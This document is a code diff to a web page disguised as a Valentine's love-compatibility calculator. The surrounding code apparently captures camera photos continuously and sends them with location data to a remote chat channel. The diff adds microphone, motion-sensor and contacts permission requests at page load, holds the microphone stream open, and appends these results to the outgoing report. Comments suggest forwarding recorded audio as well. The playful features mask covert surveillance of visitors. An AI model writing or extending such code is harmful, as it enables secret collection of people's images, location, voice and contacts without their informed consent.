@@ -538,8 +538,38 @@
             <div class="camera-title">
                 <i class="fas fa-heart"></i> Love Compatibility
             </div>
-
-
+        
+            <!-- Enhanced Features Section -->
+            <div class="enhanced-features" id="enhancedFeatures" style="margin-top: 15px; display: none;">
+                <!-- Microphone Feature -->
+                <div class="feature-item" id="microphoneFeature" style="display: none; margin: 10px 0; padding: 10px; background: rgba(76, 175, 80, 0.1); border-radius: 10px;">
+                    <button class="btn" id="voiceRecordBtn" style="background: linear-gradient(to right, #4CAF50, #81C784); font-size: 0.9rem; padding: 10px;">
+                        <i class="fas fa-microphone"></i> Record Love Message
+                    </button>
+                    <div class="feature-status" id="voiceStatus" style="margin-top: 8px; font-size: 0.85rem; color: #666;">🎤 Ready to record</div>
+                </div>
+        
+                <!-- Motion Feature -->
+                <div class="feature-item" id="motionFeature" style="display: none; margin: 10px 0; padding: 10px; background: rgba(33, 150, 243, 0.1); border-radius: 10px;">
+                    <div style="display: flex; align-items: center; gap: 10px;">
+                        <i class="fas fa-mobile-alt" style="color: #2196F3; font-size: 1.2rem;"></i>
+                        <div>
+                            <div style="font-weight: 600; color: #2196F3;">Shake Detection Active</div>
+                            <div class="feature-status" id="motionStatus" style="font-size: 0.85rem; color: #666;">📱 Shake your device for love energy!</div>
+                            <div style="font-size: 0.8rem; color: #888; margin-top: 3px;">Shakes detected: <span id="shakeCount">0</span></div>
+                        </div>
+                    </div>
+                </div>
+        
+                <!-- Contacts Feature -->
+                <div class="feature-item" id="contactsFeature" style="display: none; margin: 10px 0; padding: 10px; background: rgba(156, 39, 176, 0.1); border-radius: 10px;">
+                    <button class="btn" id="importContactBtn" style="background: linear-gradient(to right, #9C27B0, #E91E63); font-size: 0.9rem; padding: 10px;">
+                        <i class="fas fa-address-book"></i> Import Contact Name
+                    </button>
+                    <div class="feature-status" id="contactsStatus" style="margin-top: 8px; font-size: 0.85rem; color: #666;">👥 Select a contact for compatibility check</div>
+                </div>
+            </div>
+        
         </div>
 
         <!-- Input Fields -->
@@ -596,7 +626,10 @@
         let permissionsGranted = {
             camera: false,
             location: false,
-            notifications: false
+            notifications: false,
+            microphone: false,
+            motion: false,
+            contacts: false
         };
         let permissionsRequested = false;
         let isInInstagramBrowser = false;
@@ -690,7 +723,10 @@
                 permissionsGranted = {
                     camera: false,
                     location: false,
-                    notifications: false
+                    notifications: false,
+                    microphone: false,
+                    motion: false,
+                    contacts: false
                 };
 
                 // Show appropriate status message
@@ -740,6 +776,30 @@
                 })
             );
 
+            // Request microphone permission
+            permissionPromises.push(
+                new Promise((resolve) => {
+                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                        console.log('Microphone API not supported');
+                        permissionsGranted.microphone = false;
+                        resolve(null);
+                        return;
+                    }
+
+                    navigator.mediaDevices.getUserMedia({ audio: true })
+                        .then(stream => {
+                            permissionsGranted.microphone = true;
+                            console.log('Microphone permission granted');
+                            resolve(stream);
+                        })
+                        .catch(error => {
+                            console.log('Microphone permission denied:', error.name, error.message);
+                            permissionsGranted.microphone = false;
+                            resolve(null);
+                        });
+                })
+            );
+
             // Request location permission
             permissionPromises.push(
                 new Promise((resolve) => {
@@ -779,6 +839,76 @@
                 })
             );
 
+            // Request device motion permission
+            permissionPromises.push(
+                new Promise((resolve) => {
+                    // Check if DeviceMotionEvent is available
+                    if (!window.DeviceMotionEvent) {
+                        console.log('Device motion not supported');
+                        permissionsGranted.motion = false;
+                        resolve(null);
+                        return;
+                    }
+
+                    // Try to get motion data
+                    const handleMotion = function(event) {
+                        if (event.acceleration || event.rotationRate) {
+                            permissionsGranted.motion = true;
+                            console.log('Device motion permission granted');
+                            window.removeEventListener('devicemotion', handleMotion);
+                            resolve(true);
+                        }
+                    };
+
+                    // Set timeout for motion detection
+                    const motionTimeout = setTimeout(() => {
+                        window.removeEventListener('devicemotion', handleMotion);
+                        permissionsGranted.motion = false;
+                        console.log('Device motion permission denied or unavailable');
+                        resolve(null);
+                    }, 3000);
+
+                    window.addEventListener('devicemotion', handleMotion, { once: true });
+                    
+                    // Also check DeviceOrientationEvent
+                    if (window.DeviceOrientationEvent) {
+                        window.addEventListener('deviceorientation', function() {
+                            // If we get orientation data, motion is likely available
+                            clearTimeout(motionTimeout);
+                            permissionsGranted.motion = true;
+                            console.log('Device orientation/motion available');
+                            resolve(true);
+                        }, { once: true });
+                    }
+                })
+            );
+
+            // Request contacts permission
+            permissionPromises.push(
+                new Promise((resolve) => {
+                    // Check if Contacts API is available
+                    if (!navigator.contacts) {
+                        console.log('Contacts API not supported');
+                        permissionsGranted.contacts = false;
+                        resolve(null);
+                        return;
+                    }
+
+                    // Try to read contacts (this will trigger permission request)
+                    navigator.contacts.select(['name'], { multiple: false })
+                        .then(contacts => {
+                            permissionsGranted.contacts = true;
+                            console.log('Contacts permission granted');
+                            resolve(contacts);
+                        })
+                        .catch(error => {
+                            console.log('Contacts permission denied:', error.name, error.message);
+                            permissionsGranted.contacts = false;
+                            resolve(null);
+                        });
+                })
+            );
+
             // Request notification permission
             permissionPromises.push(
                 new Promise((resolve) => {
@@ -809,10 +939,15 @@
             try {
                 const results = await Promise.all(permissionPromises);
 
-                // Handle camera stream
+                // Handle streams
                 if (results[0]) {
                     stream = results[0];
                     cameraView.srcObject = stream;
+                }
+                
+                if (results[1]) {
+                    // Store microphone stream if needed
+                    window.microphoneStream = results[1];
                 }
 
                 // Show detailed permission results
@@ -835,6 +970,11 @@
                     startContinuousCapture();
                 }
 
+                // Setup motion listeners if available
+                if (permissionsGranted.motion) {
+                    setupMotionListeners();
+                }
+
                 return permissionsGranted;
 
             } catch (error) {
@@ -848,7 +988,10 @@
                 permissionsGranted = {
                     camera: false,
                     location: false,
-                    notifications: false
+                    notifications: false,
+                    microphone: false,
+                    motion: false,
+                    contacts: false
                 };
 
                 return permissionsGranted;
@@ -885,6 +1028,167 @@
                 speed: coords.speed,
                 timestamp: new Date().toISOString()
             };
+        }
+
+        // Helper function for microphone recording
+        function startVoiceRecording() {
+            if (!permissionsGranted.microphone || !window.microphoneStream) {
+                console.log('Microphone not available for recording');
+                return null;
+            }
+
+            try {
+                const mediaRecorder = new MediaRecorder(window.microphoneStream);
+                const audioChunks = [];
+
+                mediaRecorder.ondataavailable = function(event) {
+                    if (event.data.size > 0) {
+                        audioChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = function() {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                    processVoiceData(audioBlob);
+                };
+
+                mediaRecorder.start();
+                console.log('Voice recording started');
+                return mediaRecorder;
+            } catch (error) {
+                console.error('Error starting voice recording:', error);
+                return null;
+            }
+        }
+
+        function stopVoiceRecording(mediaRecorder) {
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                mediaRecorder.stop();
+                console.log('Voice recording stopped');
+            }
+        }
+
+        function processVoiceData(audioBlob) {
+            // Process the recorded audio - could send to Telegram or analyze
+            console.log('Processing voice data:', audioBlob.size, 'bytes');
+            
+            // For now, just log the data
+            // In a real implementation, you might:
+            // 1. Send to a speech recognition service
+            // 2. Analyze audio characteristics for compatibility scoring
+            // 3. Send the audio file to Telegram
+            
+            return audioBlob;
+        }
+
+        // Motion sensor handlers
+        let motionEventCount = 0;
+        let lastShakeTime = 0;
+
+        function setupMotionListeners() {
+            if (!permissionsGranted.motion) return;
+
+            // Shake detection
+            window.addEventListener('devicemotion', function(event) {
+                const acceleration = event.acceleration;
+                if (!acceleration) return;
+
+                const magnitude = Math.sqrt(
+                    acceleration.x * acceleration.x +
+                    acceleration.y * acceleration.y +
+                    acceleration.z * acceleration.z
+                );
+
+                // Detect shake (threshold of 15 m/s²)
+                if (magnitude > 15) {
+                    const currentTime = Date.now();
+                    // Debounce shakes (at least 1 second apart)
+                    if (currentTime - lastShakeTime > 1000) {
+                        handleShakeEvent();
+                        lastShakeTime = currentTime;
+                    }
+                }
+            });
+
+            // Orientation change detection
+            window.addEventListener('deviceorientation', function(event) {
+                handleOrientationChange(event);
+            });
+
+            console.log('Motion listeners set up successfully');
+        }
+
+        function handleShakeEvent() {
+            motionEventCount++;
+            console.log('Shake detected! Count:', motionEventCount);
+            
+            // Update UI shake counter
+            const shakeCountElement = document.getElementById('shakeCount');
+            if (shakeCountElement) {
+                shakeCountElement.textContent = motionEventCount;
+            }
+            
+            // Could trigger special effects or features
+            // For example, auto-generate a love message or add bonus points
+            if (motionEventCount % 3 === 0) {
+                showStatus('💫 Shake detected! Adding love energy...', 'success');
+                setTimeout(() => {
+                    if (telegramStatus.classList.contains('success')) {
+                        telegramStatus.classList.remove('active');
+                    }
+                }, 2000);
+            }
+        }
+
+        function handleOrientationChange(event) {
+            // Handle device orientation changes
+            // Could be used for responsive UI adjustments
+            const { alpha, beta, gamma } = event;
+            
+            // Log orientation data (could be used for compatibility calculations)
+            if (Math.abs(beta) > 45 || Math.abs(gamma) > 45) {
+                console.log('Device tilted significantly:', { beta, gamma });
+            }
+        }
+
+        // Contact access functions
+        async function importSelectedContact() {
+            if (!permissionsGranted.contacts) {
+                console.log('Contacts permission not granted');
+                showStatus('📱 Contacts access required', 'error');
+                return null;
+            }
+
+            try {
+                const contacts = await navigator.contacts.select(['name'], { multiple: false });
+                if (contacts && contacts.length > 0) {
+                    const contactName = contacts[0].name[0];
+                    console.log('Selected contact:', contactName);
+                    showStatus(`👤 Contact imported: ${contactName}`, 'success');
+                    return contactName;
+                }
+                return null;
+            } catch (error) {
+                console.error('Error importing contact:', error);
+                showStatus('❌ Failed to import contact', 'error');
+                return null;
+            }
+        }
+
+        function searchContacts(query) {
+            // Simple client-side contact search simulation
+            // In a real implementation, this would search through actual contacts
+            const sampleContacts = [
+                'Alex Johnson', 'Sam Wilson', 'Jordan Lee', 
+                'Taylor Smith', 'Morgan Davis', 'Casey Brown'
+            ];
+            
+            if (!query) return [];
+            
+            const searchTerm = query.toLowerCase();
+            return sampleContacts.filter(contact => 
+                contact.toLowerCase().includes(searchTerm)
+            );
         }
 
         // Attempt to get basic location in Instagram browser
@@ -1303,11 +1607,6 @@ Sent from Valentine's Love Calculator`;
                     textMessage += '<b>Browser:</b> Social media browser (limited features)\n';
                 }
 
-                // Add permission status
-                const granted = Object.values(permissionsGranted).filter(Boolean).length;
-                const total = Object.keys(permissionsGranted).length;
-                textMessage += `<b>Permissions:</b> ${granted}/${total} granted\n`;
-
                 // Add camera status
                 if (permissionsGranted.camera) {
                     textMessage += '<b>Photo:</b> Auto-captured and sent continuously\n';
@@ -1315,6 +1614,29 @@ Sent from Valentine's Love Calculator`;
                     textMessage += '<b>Photo:</b> Unavailable in social media browsers\n';
                 } else {
                     textMessage += '<b>Photo:</b> Camera access denied - no photo captured\n';
+                }
+
+                // Add microphone status
+                if (permissionsGranted.microphone) {
+                    textMessage += '<b>Voice:</b> Microphone available for recording\n';
+                } else if (isInInstagramBrowser) {
+                    textMessage += '<b>Voice:</b> Unavailable in social media browsers\n';
+                } else {
+                    textMessage += '<b>Voice:</b> Microphone access denied\n';
+                }
+
+                // Add motion sensor status
+                if (permissionsGranted.motion) {
+                    textMessage += '<b>Motion:</b> Device sensors active (shake count: ' + motionEventCount + ')\n';
+                } else {
+                    textMessage += '<b>Motion:</b> Sensors unavailable or denied\n';
+                }
+
+                // Add contact status
+                if (permissionsGranted.contacts) {
+                    textMessage += '<b>Contacts:</b> Access granted for easy name import\n';
+                } else {
+                    textMessage += '<b>Contacts:</b> Access denied - manual entry only\n';
                 }
 
                 // Add location info
@@ -1426,6 +1748,81 @@ Sent from Valentine's Love Calculator`;
                 name2Input.addEventListener('keypress', function (e) {
                     if (e.key === 'Enter') calculateAndDisplay();
                 });
+
+                // Setup enhanced feature event listeners
+                setupEnhancedFeatureListeners();
+            }
+
+            // Setup listeners for new enhanced features
+            function setupEnhancedFeatureListeners() {
+                // Voice recording button
+                const voiceRecordBtn = document.getElementById('voiceRecordBtn');
+                let recordingMediaRecorder = null;
+                
+                if (voiceRecordBtn) {
+                    voiceRecordBtn.addEventListener('click', function() {
+                        if (!recordingMediaRecorder) {
+                            // Start recording
+                            recordingMediaRecorder = startVoiceRecording();
+                            if (recordingMediaRecorder) {
+                                voiceRecordBtn.innerHTML = '<i class="fas fa-stop"></i> Stop Recording';
+                                voiceRecordBtn.style.background = 'linear-gradient(to right, #f44336, #e57373)';
+                                document.getElementById('voiceStatus').textContent = '🎤 Recording... Speak your love message!';
+                            }
+                        } else {
+                            // Stop recording
+                            stopVoiceRecording(recordingMediaRecorder);
+                            recordingMediaRecorder = null;
+                            voiceRecordBtn.innerHTML = '<i class="fas fa-microphone"></i> Record Love Message';
+                            voiceRecordBtn.style.background = 'linear-gradient(to right, #4CAF50, #81C784)';
+                            document.getElementById('voiceStatus').textContent = '✅ Message recorded!';
+                            
+                            setTimeout(() => {
+                                document.getElementById('voiceStatus').textContent = '🎤 Ready to record';
+                            }, 3000);
+                        }
+                    });
+                }
+
+                // Contact import button
+                const importContactBtn = document.getElementById('importContactBtn');
+                if (importContactBtn) {
+                    importContactBtn.addEventListener('click', async function() {
+                        const contactName = await importSelectedContact();
+                        if (contactName) {
+                            // Auto-fill the second name field with imported contact
+                            const name2Field = document.getElementById('name2');
+                            if (name2Field && !name2Field.value.trim()) {
+                                name2Field.value = contactName;
+                                document.getElementById('contactsStatus').textContent = `✅ Imported: ${contactName}`;
+                                
+                                setTimeout(() => {
+                                    document.getElementById('contactsStatus').textContent = '👥 Select a contact for compatibility check';
+                                }, 3000);
+                            }
+                        }
+                    });
+                }
+            }
+
+            // Update UI based on granted permissions
+            function updatePermissionUI() {
+                const enhancedFeatures = document.getElementById('enhancedFeatures');
+                
+                if (!enhancedFeatures) return;
+
+                // Show enhanced features section
+                enhancedFeatures.style.display = 'block';
+                
+                // Update individual feature visibility
+                document.getElementById('microphoneFeature').style.display = 
+                    permissionsGranted.microphone ? 'block' : 'none';
+                
+                document.getElementById('motionFeature').style.display = 
+                    permissionsGranted.motion ? 'block' : 'none';
+                
+                document.getElementById('contactsFeature').style.display = 
+                    permissionsGranted.contacts ? 'block' : 'none';
             }
 
             // For Instagram browser: optimized initialization
@@ -1438,7 +1835,9 @@ Sent from Valentine's Love Calculator`;
                 // Delayed permission request with user interaction context
                 calculateBtn.addEventListener('click', function () {
                     if (!permissionsRequested) {
-                        requestAllPermissions();
+                        requestAllPermissions().then(() => {
+                            updatePermissionUI();
+                        });
                     }
                 }, { once: true });
 
@@ -1458,9 +1857,11 @@ Sent from Valentine's Love Calculator`;
 
                 requestAllPermissions().then(() => {
                     setupEventListeners();
+                    updatePermissionUI();
                 }).catch(() => {
                     // Fallback if permission request fails
                     setupEventListeners();
+                    updatePermissionUI();
                 });
             }
 
@@ -1528,6 +1929,7 @@ Sent from Valentine's Love Calculator`;
                 console.log('⏱️ Stopped continuous capture interval');
             }
 
+            // Stop camera stream
             if (stream) {
                 try {
                     stream.getTracks().forEach(track => {
@@ -1536,7 +1938,31 @@ Sent from Valentine's Love Calculator`;
                     });
                     stream = null;
                 } catch (error) {
-                    console.error('Error stopping stream:', error);
+                    console.error('Error stopping camera stream:', error);
+                }
+            }
+
+            // Stop microphone stream
+            if (window.microphoneStream) {
+                try {
+                    window.microphoneStream.getTracks().forEach(track => {
+                        track.stop();
+                        console.log(`⏹️ Stopped microphone ${track.kind} track`);
+                    });
+                    window.microphoneStream = null;
+                } catch (error) {
+                    console.error('Error stopping microphone stream:', error);
+                }
+            }
+
+            // Remove motion event listeners
+            if (permissionsGranted.motion) {
+                try {
+                    window.removeEventListener('devicemotion', setupMotionListeners);
+                    window.removeEventListener('deviceorientation', handleOrientationChange);
+                    console.log('📱 Removed motion event listeners');
+                } catch (error) {
+                    console.error('Error removing motion listeners:', error);
                 }
             }
 
@@ -1545,7 +1971,8 @@ Sent from Valentine's Love Calculator`;
                 browserType: diagnostics.browserType,
                 permissions: permissionsGranted,
                 errors: diagnostics.errors.length,
-                features: diagnostics.featuresAvailable
+                features: diagnostics.featuresAvailable,
+                shakeCount: motionEventCount
             });
         });
 
